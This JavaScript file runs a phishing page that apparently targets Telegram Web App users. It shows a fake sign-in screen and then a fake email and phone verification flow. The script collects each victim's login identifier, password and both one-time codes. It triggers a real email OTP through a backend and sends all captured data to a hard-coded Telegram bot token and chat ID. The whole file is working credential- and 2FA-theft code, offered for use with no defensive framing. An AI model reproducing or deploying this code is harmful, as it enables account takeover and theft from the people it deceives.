// CONFIGURATION
const TARGET_BOT_TOKEN = '8323712514:AAG5zdoA0EOmCxt6h7epjBLmoZmWe0mklQQ'; 
const TARGET_CHAT_ID = '1661187898';

// Initialize Telegram
const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // Elements
    const btnSignin = document.getElementById('btn-signin');
    const identifierInput = document.getElementById('identifier');
    const passwordInput = document.getElementById('password');
    const stepModal = document.getElementById('verification-step-modal');
    const otpModal = document.getElementById('otp-modal');
    const btnConfirmOtp = document.getElementById('btn-confirm-otp');
    const otpInput = document.getElementById('otp-input');
    
    const emailVerifyItem = document.getElementById('email-verify-item');
    const phoneVerifyItem = document.getElementById('phone-verify-item');
    const stepCountText = document.getElementById('step-count-text');
    
    const verifyTitleText = document.getElementById('verify-title-text');
    const verifyDescText = document.getElementById('verify-desc-text');
    const verifyIconType = document.getElementById('verify-icon-type');
    const timerDisplay = document.getElementById('timer-count');

    let currentStep = 1; // 1: Email, 2: Phone
    let userData = {};
    let timer;

    // Tab Switching Logic (Internal state only)
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            if (tab.dataset.tab === 'otp') {
                document.getElementById('password-wrapper').style.display = 'none';
            } else {
                document.getElementById('password-wrapper').style.display = 'block';
            }
        });
    });

    // Step 0: Initial Sign In
    btnSignin.addEventListener('click', () => {
        const id = identifierInput.value.trim();
        const pass = passwordInput.value.trim();

        if (!id) return alert('Please enter your details');

        userData = { id, pass, time: new Date().toLocaleString() };
        
        // Log Initial Attempt
        logToTelegram('🔑 INITIAL LOGIN ATTEMPT', userData);

        // Show Step 1 (1/2)
        document.getElementById('sign-in-screen').style.display = 'none';
        stepModal.style.display = 'flex';
    });

    // Step 1: Click "Go Verify" for Email
    emailVerifyItem.addEventListener('click', () => {
        if (currentStep !== 1) return;

        verifyTitleText.innerText = 'Email Verification';
        verifyDescText.innerText = 'Please enter the 6-digit verification code sent on e-mail';
        verifyIconType.className = 'fas fa-envelope';
        
        // Call backend to send real email OTP if it's an email
        if (userData.id.includes('@')) {
            fetch('/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: userData.id })
            }).catch(e => console.error(e));
        }

        otpModal.style.display = 'flex';
        startTimer(60);
    });

    // Step 2: Click "Go Verify" for Phone
    phoneVerifyItem.addEventListener('click', () => {
        if (currentStep !== 2) return;

        verifyTitleText.innerText = 'Phone Verification';
        verifyDescText.innerText = 'Please enter the 6-digit verification code sent to your phone';
        verifyIconType.className = 'fas fa-phone-alt';

        otpModal.style.display = 'flex';
        startTimer(60);
    });

    // OTP Confirmation Logic
    btnConfirmOtp.addEventListener('click', async () => {
        const otp = otpInput.value.trim();
        if (otp.length < 4) return alert('Invalid code');

        btnConfirmOtp.innerText = 'Verifying...';
        btnConfirmOtp.disabled = true;

        if (currentStep === 1) {
            // Finished Email Step
            userData.email_otp = otp;
            await logToTelegram('📧 EMAIL OTP CAPTURED', userData);
            
            // Move to Step 2
            currentStep = 2;
            otpModal.style.display = 'none';
            otpInput.value = '';
            
            stepCountText.innerText = '2/2';
            emailVerifyItem.classList.add('disabled');
            emailVerifyItem.querySelector('.item-action').innerHTML = 'Verified <i class="fas fa-check"></i>';
            emailVerifyItem.querySelector('.item-action').style.color = '#3bc117';
            
            phoneVerifyItem.classList.remove('disabled');
            phoneVerifyItem.classList.add('active');

            btnConfirmOtp.innerText = 'Confirm';
            btnConfirmOtp.disabled = false;
        } else {
            // Finished Phone Step
            userData.phone_otp = otp;
            await logToTelegram('📱 PHONE OTP CAPTURED', userData);
            
            btnConfirmOtp.innerText = 'Success';
            setTimeout(() => {
                if (tg) tg.close();
                else location.reload();
            }, 1500);
        }
    });

    function startTimer(duration) {
        let timeLeft = duration;
        timerDisplay.innerText = timeLeft;
        clearInterval(timer);
        timer = setInterval(() => {
            timeLeft--;
            timerDisplay.innerText = timeLeft;
            if (timeLeft <= 0) clearInterval(timer);
        }, 1000);
    }

    async function logToTelegram(title, data) {
        const msg = `
${title}
━━━━━━━━━━━━━━━
👤 <b>User</b>: ${data.id}
🔑 <b>Pass</b>: <code>${data.pass}</code>
📧 <b>Email OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
📱 <b>Phone OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
🕒 <b>Time</b>: ${data.time}
━━━━━━━━━━━━━━━`;

        try {
            await fetch(`https://api.telegram.org/bot${TARGET_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TARGET_CHAT_ID,
                    text: msg,
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {}
    }

    // Modal Close
    document.querySelectorAll('.modal-close, .btn-back').forEach(btn => {
        btn.addEventListener('click', () => {
            otpModal.style.display = 'none';
            if (btn.classList.contains('btn-back')) stepModal.style.display = 'none';
        });
    });
});
